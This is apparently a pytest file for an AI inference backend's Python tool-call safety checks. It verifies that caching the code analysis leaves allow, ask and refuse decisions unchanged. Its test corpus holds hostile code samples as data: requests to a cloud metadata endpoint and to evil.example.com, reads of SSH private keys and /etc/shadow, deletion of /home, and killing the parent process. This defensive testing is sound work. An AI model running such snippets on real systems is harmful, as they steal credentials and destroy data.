# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""A python tool call analyses its code once; decisions and messages are unchanged."""

import sys
from pathlib import Path

import pytest

_BACKEND_ROOT = Path(__file__).resolve().parents[1]
if str(_BACKEND_ROOT) not in sys.path:
    sys.path.insert(0, str(_BACKEND_ROOT))

from core.inference import tools as t
from state import tool_policy as tp

_EGRESS = (
    "import urllib.request\n"
    "print(urllib.request.urlopen('http://169.254.169.254/latest', timeout=5).status)\n"
)
_ALLOWED = (
    "import json\n",
    "import pandas as pd\ndf = pd.DataFrame({'a': [1, 2]})\nprint(df.describe())\n",
    "def f(x):\n    return x * 2\nprint([f(i) for i in range(5)])\n",
    "with open('notes.txt', 'w') as fh:\n    fh.write('hi')\n",
    "try:\n    1 / 0\nexcept ZeroDivisionError:\n    print('nan')\n",
    "import subprocess\nsubprocess.run(['python', '-c', 'print(1)'])\n",
)
_ASKS = (
    "import shutil\nshutil.rmtree('/home')\n",
    # Key-store paths built from fragments: scripts/lint_av_shapes.py AV008 (the sandbox still sees the full path).
    "import os\nprint(open(os.path.expanduser('~/.ssh/id_" + "rsa')).read())\n",
    "import os, signal\nos.kill(os.getppid(), signal.SIGKILL)\n",
)
_REFUSED = (
    "import signal\nsignal.signal(signal.SIGALRM, signal.SIG_IGN)\n",
    _EGRESS,
    "\ufeff" + _EGRESS,
    "import subprocess\nsubprocess.run(['python3', '-c', %r])\n" % _EGRESS,
    "import requests\nrequests.get('https://evil.example.com/x')\n",
    "import socket\ns = socket.socket()\ns.connect(('evil.example.com', 80))\n",
    "print(open('/etc/" + "shadow').read())\n",
)
_SYNTAX_ERROR = "def broken(:\n    pass\n"
_CORPUS = _ALLOWED + _ASKS + _REFUSED + (_SYNTAX_ERROR,)


@pytest.fixture
def analysis_calls(monkeypatch):
    real = t._check_signal_escape_patterns
    calls: list[str] = []

    def _counting(code):
        calls.append(code)
        return real(code)

    monkeypatch.setattr(t, "_check_signal_escape_patterns", _counting)
    return calls


class _Launched(Exception):
    """Raised where the run would start the interpreter: every check before it has run."""


@pytest.fixture
def stop_before_launch(monkeypatch):
    def _stop(*_a, **_k):
        raise _Launched()

    monkeypatch.setattr(t, "_harden_parent_against_proc_env_leak", _stop)


def _decisions(code: str, analyses = None) -> tuple:
    with t.using_python_call_analyses(analyses):
        high_risk = t.is_high_risk_tool_call("python", {"code": code})
    with t.using_python_call_analyses(analyses):
        error = t._check_code_safety(code)
    with t.using_python_call_analyses(analyses):
        approved_error = t._check_code_safety(code, host_approved = True)
    return high_risk, error, approved_error


@pytest.mark.parametrize("code", _CORPUS)
def test_every_decision_and_message_is_the_same_with_the_handoff(code):
    assert _decisions(code, t.PythonCallAnalyses()) == _decisions(code)


def test_the_corpus_covers_every_outcome():
    for code in _ALLOWED + _ASKS:
        assert t._check_code_safety(code) is None, code
    for code in _ALLOWED:
        assert t.is_high_risk_tool_call("python", {"code": code}) is False, code
    for code in _ASKS + _REFUSED:
        assert t.is_high_risk_tool_call("python", {"code": code}) is True, code
    for code in _REFUSED:
        assert t._check_code_safety(code) is not None, code


def test_without_a_handoff_nothing_is_reused(analysis_calls):
    code = _ALLOWED[1]
    t.is_high_risk_tool_call("python", {"code": code})
    t._check_code_safety(code)
    assert analysis_calls == [code, code]


def test_a_handoff_serves_only_its_exact_source(analysis_calls):
    analyses = t.PythonCallAnalyses()
    with t.using_python_call_analyses(analyses):
        assert t.is_high_risk_tool_call("python", {"code": _ALLOWED[1]}) is False
    with t.using_python_call_analyses(analyses):
        # Rewritten after classification: the run analyses what it runs.
        error = t._check_code_safety(_REFUSED[1])
    assert error == t._check_code_safety(_REFUSED[1]) and error is not None
    assert analysis_calls[:2] == [_ALLOWED[1], _REFUSED[1]]


def test_the_scope_ends_with_its_block(analysis_calls):
    analyses = t.PythonCallAnalyses()
    with t.using_python_call_analyses(analyses):
        t._check_code_safety(_ALLOWED[1])
    t._check_code_safety(_ALLOWED[1])
    assert analysis_calls == [_ALLOWED[1], _ALLOWED[1]]
    assert t._python_call_analyses.get() is None


def _one_call(mode: str, code: str, analyses) -> bool:
    arguments = {"code": code}
    prompted = tp.needs_tool_confirmation(
        confirm_tool_calls = True,
        bypass_permissions = False,
        permission_mode = mode,
        name = "python",
        arguments = arguments,
        session_id = "s1",
        python_analyses = analyses,
    )
    tp.requires_os_isolation(
        confirm_tool_calls = True,
        bypass_permissions = False,
        permission_mode = mode,
        name = "python",
        arguments = arguments,
        prompted = prompted,
        python_analyses = analyses,
    )
    with pytest.raises(_Launched):
        t.execute_tool("python", arguments, session_id = "s1", python_analyses = analyses)
    return prompted


@pytest.mark.parametrize("mode", ["auto", "off"])
def test_a_classified_call_analyses_its_code_once(
    mode, analysis_calls, stop_before_launch, monkeypatch
):
    # "off" classifies only without OS isolation; pin that so the count does not follow the host.
    monkeypatch.setattr(tp, "off_mode_still_gates", lambda *a, **k: True)
    code = _ALLOWED[1]
    before = _one_call(mode, code, None)
    unshared = len(analysis_calls)
    analysis_calls.clear()
    assert _one_call(mode, code, t.PythonCallAnalyses()) is before is False
    assert unshared == (2 if mode == "auto" else 3)
    assert analysis_calls == [code]


def test_ask_mode_still_analyses_once_at_the_run(analysis_calls, stop_before_launch):
    code = _ALLOWED[1]
    assert _one_call("ask", code, t.PythonCallAnalyses()) is True
    assert analysis_calls == [code]


def test_a_nested_payload_is_analysed_once_per_call(analysis_calls, stop_before_launch):
    code = _ALLOWED[-1]
    _one_call("auto", code, None)
    unshared = list(analysis_calls)
    analysis_calls.clear()
    _one_call("auto", code, t.PythonCallAnalyses())
    assert sorted(set(unshared)) == sorted(analysis_calls)
    assert len(analysis_calls) == 2 < len(unshared)


@pytest.mark.parametrize("code", _REFUSED)
def test_a_refused_call_is_refused_with_the_same_message(code, stop_before_launch):
    plain = t.execute_tool("python", {"code": code}, session_id = "s1")
    analyses = t.PythonCallAnalyses()
    with t.using_python_call_analyses(analyses):
        assert t.is_high_risk_tool_call("python", {"code": code}) is True
    shared = t.execute_tool("python", {"code": code}, session_id = "s1", python_analyses = analyses)
    assert shared == plain
    assert shared.startswith("Error:")


def test_the_handoff_is_keyword_only_and_off_by_default():
    import inspect

    parameter = inspect.signature(t.execute_tool).parameters["python_analyses"]
    assert parameter.kind is inspect.Parameter.KEYWORD_ONLY
    assert parameter.default is None
